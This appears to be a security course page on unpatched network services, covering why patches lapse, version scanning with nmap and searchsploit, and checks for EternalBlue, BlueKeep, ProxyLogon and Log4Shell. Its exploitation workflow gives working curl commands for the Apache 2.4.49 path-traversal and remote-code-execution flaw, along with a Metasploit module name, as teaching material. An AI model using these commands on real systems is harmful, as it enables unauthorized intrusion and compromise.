# Unpatched Services

## Unit 3 - Topic 3 | Network Vulnerabilities

---

## Overview

**Unpatched services** run outdated software versions with known vulnerabilities (CVEs). Patch management failures are among the most common and most impactful security weaknesses in enterprise networks.

---

## 1. Why Services Go Unpatched

```
COMMON REASONS FOR UNPATCHED SERVICES:

ORGANIZATIONAL:
├── No patch management process
├── Understaffed IT teams
├── Fear of breaking production systems
├── Complex approval processes
├── No testing environment
└── Budget constraints

TECHNICAL:
├── Legacy systems (can't upgrade)
├── Custom applications with dependencies
├── Vendor-abandoned software (EOL)
├── Hardware limitations
├── Incompatible with newer versions
└── No downtime window available

AWARENESS:
├── Don't know vulnerability exists
├── No vulnerability scanning program
├── Assumed "not internet-facing = safe"
├── Shadow IT (unknown systems)
└── Forgot about the system entirely
```

---

## 2. Finding Unpatched Services

```bash
# === NMAP VERSION SCAN ===
sudo nmap -sS -sV -O -p- target.com -oX scan.xml

# === SEARCHSPLOIT CORRELATION ===
searchsploit --nmap scan.xml
# Matches detected versions against Exploit-DB

# === NMAP VULNERS SCRIPT ===
nmap -sV --script vulners target.com
# Real-time CVE lookup for each detected version

# === VULNERABILITY SCANNERS ===
# Nessus — most comprehensive
# OpenVAS — free alternative
# Qualys — cloud-based
# All check for: missing patches, EOL software, known CVEs

# === MANUAL VERSION CHECK ===
# Detected: Apache 2.4.49
# Current stable: Apache 2.4.58
# Gap: 9 versions behind → likely multiple CVEs

# === EOL (End of Life) CHECK ===
# endoflife.date — check if software is still supported
# Windows Server 2012 R2 → EOL October 2023
# Ubuntu 18.04 → EOL April 2023
# Python 2.7 → EOL January 2020
```

---

## 3. High-Impact Unpatched Vulnerabilities

```bash
# === ETERNALBLUE (MS17-010) ===
nmap -p 445 --script smb-vuln-ms17-010 target.com
# Affects: Windows 7/2008/2008R2/2012 with SMBv1
# Impact: Remote code execution → worm propagation
# Exploit: msf> use exploit/windows/smb/ms17_010_eternalblue

# === BLUEKEEP (CVE-2019-0708) ===
nmap -p 3389 --script rdp-vuln-ms12-020 target.com
# Affects: Windows 7/2008 R2 with RDP
# Impact: Remote code execution (pre-authentication!)

# === PROXYLOGON (CVE-2021-26855) ===
# Affects: Microsoft Exchange Server 2013-2019
# Impact: Pre-auth RCE on mail server
# Check: Nmap + Exchange version detection

# === LOG4SHELL (CVE-2021-44228) ===
# Affects: Any application using Log4j 2.x
# Impact: Remote code execution
# Check: Various scanners + manual testing
```

---

## 4. Patch Gap Analysis

| Software | Detected | Current | Versions Behind | Risk |
|----------|:--------:|:-------:|:---------------:|:----:|
| Apache | 2.4.49 | 2.4.58 | 9 | ★★★★★ |
| OpenSSH | 8.2 | 9.6 | 14 | ★★★ |
| PHP | 7.4 | 8.3 | EOL! | ★★★★★ |
| MySQL | 5.7 | 8.2 | Major version | ★★★★ |
| Windows | 2012 R2 | 2022 | EOL! | ★★★★★ |
| nginx | 1.20 | 1.25 | 5 | ★★ |

---

## 5. Exploitation Workflow

```
UNPATCHED SERVICE EXPLOITATION:

1. DETECT
   nmap -sV target → Apache 2.4.49

2. RESEARCH
   searchsploit apache 2.4.49
   → CVE-2021-41773 (Path Traversal + RCE)

3. VERIFY
   curl "http://target/cgi-bin/.%2e/%2e%2e/etc/passwd"
   → root:x:0:0:root:/root:/bin/bash
   → VULNERABLE! ✅

4. EXPLOIT
   # RCE via mod_cgi:
   curl "http://target/cgi-bin/.%2e/%2e%2e/bin/sh" \
     -d "echo; id; whoami"
   → uid=1(daemon) groups=1(daemon)

5. ESCALATE
   Upload reverse shell → privilege escalation
   → Full system compromise

6. REPORT
   CVE: CVE-2021-41773
   Impact: Remote Code Execution
   Remediation: Upgrade to Apache 2.4.51+
   Priority: CRITICAL
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Unpatched** | Known vulnerabilities with available fixes |
| **Detection** | Nmap -sV + searchsploit/vulners |
| **EOL software** | No patches available — must replace |
| **EternalBlue** | SMBv1 RCE — still found on networks |
| **Impact** | Often leads to RCE and full compromise |
| **Defense** | Patch management + vulnerability scanning |

---

## Quick Revision Questions

1. **Why do organizations fail to patch services?**
2. **How do you identify unpatched services?**
3. **What is EOL software and why is it critical?**
4. **What is EternalBlue and how do you check for it?**
5. **What is the typical exploitation workflow for unpatched services?**

---

[← Previous: Default Credentials](02-default-credentials.md) | [Next: Misconfigurations →](04-misconfigurations.md)

---

*Unit 3 - Topic 3 of 6 | [Back to README](../README.md)*
